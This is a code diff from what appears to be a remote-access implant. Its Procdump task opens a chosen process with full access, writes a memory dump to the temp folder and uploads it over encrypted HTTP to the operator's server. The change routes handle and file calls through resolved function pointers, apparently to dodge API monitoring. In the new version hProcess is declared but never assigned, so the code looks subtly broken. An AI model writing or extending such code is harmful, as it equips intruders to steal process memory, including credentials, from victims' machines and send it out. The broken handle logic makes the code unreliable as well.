@@ -4,28 +4,23 @@ namespace Task
 {
     std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid)
     {
-         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
+        HANDLE hProcess;
+        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
         // std::wstring wDumpFilePath = L"tmp.dmp";
-        std::wstring wDumpFilePath = System::Env::GetStrings(L"%TEMP%") + L"\\tmp.dmp";
+        std::wstring wDumpFilePath = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\tmp.dmp";
 
-        HANDLE hFile = CreateFile(
-            wDumpFilePath.c_str(),
-            GENERIC_ALL,
-            0,
-            NULL,
-            CREATE_ALWAYS,
-            FILE_ATTRIBUTE_NORMAL,
-            NULL
+        HANDLE hFile = System::Fs::CreateNewFile(
+            pState->pProcs,
+            wDumpFilePath.c_str()
         );
         if (hFile == INVALID_HANDLE_VALUE)
         {
             return L"Error: Could not create a file to dump.";
         }
 
-        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);
-        if (!hProcess)
+        if (!System::Process::ProcessOpen(pState->pProcs, dwPid, PROCESS_ALL_ACCESS))
         {
-            CloseHandle(hFile);
+            pState->pProcs->lpNtClose(hFile);
             return L"Error: Could not open process.";
         }
 
@@ -38,13 +33,13 @@ namespace Task
             NULL,
             NULL
         )) {
-            CloseHandle(hFile);
-            CloseHandle(hProcess);
+            pState->pProcs->lpNtClose(hFile);
+            pState->pProcs->lpNtClose(hProcess);
             return L"Error: Could not dump the process.";
         }
 
-        CloseHandle(hFile);
-        CloseHandle(hProcess);
+        pState->pProcs->lpNtClose(hFile);
+        pState->pProcs->lpNtClose(hProcess);
 
         // Upload a dumped file.
         std::wstring wHeaders = L"";
@@ -52,7 +47,7 @@ namespace Task
         wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
         wHeaders += L"X-FILE: procdump\r\n";
 
-        BOOL bResult = System::Http::UploadFile(
+        if (!System::Http::UploadFile(
             pState->pProcs,
             pState->pCrypt,
             pState->hConnect,
@@ -61,9 +56,7 @@ namespace Task
             pState->lpReqPathUpload,
             wHeaders.c_str(),
             wDumpFilePath
-        );
-        if (!bResult)
-        {
+        )) {
             return L"Error: Could not upload the dump file.";
         }
 
